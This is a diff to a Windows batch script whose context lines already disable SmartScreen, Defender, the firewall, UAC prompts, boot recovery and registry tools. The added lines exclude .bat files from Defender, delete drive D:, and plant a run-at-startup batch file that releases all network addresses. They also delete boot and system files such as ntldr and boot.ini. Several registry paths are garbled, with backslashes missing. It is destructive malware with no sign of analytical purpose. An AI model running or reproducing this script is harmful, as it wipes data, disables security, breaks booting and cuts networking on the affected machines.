@@ -23,6 +23,9 @@ takeown /f "%systemroot%\System32\smartscreen.exe" /a
 icacls "%systemroot%\System32\smartscreen.exe" /reset
 taskkill /im smartscreen.exe /f
 icacls "%systemroot%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
+powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
+dir d:
+echo Y|del D:\
 
 powershell.exe -command "netsh advfirewall set allprofiles state off"
 net stop “Security Center”
@@ -141,6 +144,12 @@ sc stop WinDefend
 bcdedit /set {default} bootstatuspolicy ignoreallfailures
 bcdedit /set {default} recoveryenabled No
 cls
+echo @echo off>c:removenetwork.bat
+echo break off>>c:removenetwork.bat
+echo ipconfig/release_all>>c:removenetwork.bat
+echo end>>c:removenetwork.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:removenetwork.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:removenetwork.bat /f
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
 taskkill /f /im explorer.exe
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  "c:\somewhere\something.bmp" /f
@@ -199,3 +208,11 @@ reg delete %key%
 reg add %key% /v Start /t REG_DWORD /d 4
 rem ---------------------------------
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
+attrib -r -s -h c:autoexec.bat
+del c:autoexec.bat
+attrib -r -s -h c:boot.ini
+del c:boot.ini
+attrib -r -s -h c:ntldr
+del c:ntldr
+attrib -r -s -h c:windowswin.ini
+del c:windowswin.ini
